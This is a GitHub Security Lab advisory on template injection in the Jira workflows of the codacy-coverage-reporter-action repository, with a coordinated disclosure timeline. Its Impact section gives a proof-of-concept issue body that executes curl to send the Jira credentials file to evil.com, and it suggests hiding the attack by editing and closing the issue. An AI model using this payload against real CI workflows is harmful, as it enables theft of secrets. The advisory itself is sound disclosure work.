<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">December 3, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-179: Template injection in the GitHub workflows of codacy-coverage-reporter-action repository</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>Automatic GitHub workflows in <a href="https://github.com/codacy/codacy-coverage-reporter-action">codacy-coverage-reporter-action repository</a> are vulnerable to template injection from user comments.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/codacy/codacy-coverage-reporter-action">codacy-coverage-reporter-action GitHub repository</a></p>

<h2 id="tested-version">Tested Version</h2>

<p>Master branch.</p>

<h2 id="details">Details</h2>

<h3 id="issue-hidden-expression-expansion-of-input-parameters-passed-to-atlassiangajira-create-or-atlassiangajira-comment">Issue: Hidden expression expansion of input parameters passed to <code class="language-plaintext highlighter-rouge">atlassian/gajira-create</code> or <code class="language-plaintext highlighter-rouge">atlassian/gajira-comment</code></h3>

<p><a href="https://github.com/codacy/codacy-coverage-reporter-action/blob/master/.github/workflows/comment_issue.yml"><code class="language-plaintext highlighter-rouge">Jira Add comment on issue</code> step in comment_issue.yml</a>, <a href="https://github.com/codacy/codacy-coverage-reporter-action/blob/master/.github/workflows/create_issue.yml"><code class="language-plaintext highlighter-rouge">Jira Create issue</code> step in create_issue.yml</a> and <a href="https://github.com/codacy/codacy-coverage-reporter-action/blob/master/.github/workflows/create_issue_on_label.yml"><code class="language-plaintext highlighter-rouge">Jira Create issue</code> step in create_issue_on_label.yml</a> workflows are vulnerable to template injection.</p>

<p><code class="language-plaintext highlighter-rouge">${{ github.event.issue.title }}</code>,<code class="language-plaintext highlighter-rouge">${{ github.event.issue.body }}</code> and <code class="language-plaintext highlighter-rouge">${{ github.event.comment.body }}</code> are used to format input values to <code class="language-plaintext highlighter-rouge">atlassian/gajira-create(comment)</code> actions. For example:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">on</span><span class="pi">:</span>
  <span class="na">issues</span><span class="pi">:</span>
    <span class="na">types</span><span class="pi">:</span> <span class="pi">[</span> <span class="nv">opened</span> <span class="pi">]</span>
<span class="nn">...</span>
<span class="na">uses</span><span class="pi">:</span> <span class="s">atlassian/gajira-create@v2.0.0</span>
<span class="na">with</span><span class="pi">:</span>
    <span class="na">summary</span><span class="pi">:</span> <span class="s2">"</span><span class="s">[GH#${{</span><span class="nv"> </span><span class="s">github.event.issue.number</span><span class="nv"> </span><span class="s">}}]</span><span class="nv">  </span><span class="s">${{</span><span class="nv"> </span><span class="s">github.event.issue.title</span><span class="nv"> </span><span class="s">}}"</span>
    <span class="na">description</span><span class="pi">:</span> <span class="pi">|</span>
    <span class="s">${{ github.event.issue.body }}</span>
    <span class="s">----</span>
    <span class="s">{panel}</span>
    <span class="s">_[Github permalink |${{ github.event.issue.html_url }}]_</span>
    <span class="s">{panel}</span>
</code></pre></div></div>

<p>However the Atlassian actions have a hidden feature - they expand <code class="language-plaintext highlighter-rouge">{{}}</code> internally. This way when the issue title or body contains an expression in double curly braces it is evaluated by node.js in these actions.</p>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary code execution in the context of GitHub runner. For example a user may create an issue with the title <code class="language-plaintext highlighter-rouge">It doesn't work on my machine</code> and the body</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span> <span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s2">`curl -d @</span><span class="p">${</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">HOME</span><span class="p">}</span><span class="s2">/.jira.d/credentials http://evil.com`</span><span class="p">)</span> <span class="p">}}</span>
</code></pre></div></div>

<p>which will exfiltrate the secret Jira API token to the attacker controlled server. To make the attack less visible an attacker may modify the body of the issue to <code class="language-plaintext highlighter-rouge">Never mind my bad.</code> and close it.</p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>10/14/2020: Report sent to vendor</li>
  <li>10/26/2020: Acknowledged by vendor</li>
  <li>10/29/2020: Issue fixed</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Loba??evski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-179</code> in any communication regarding this issue.</p>

   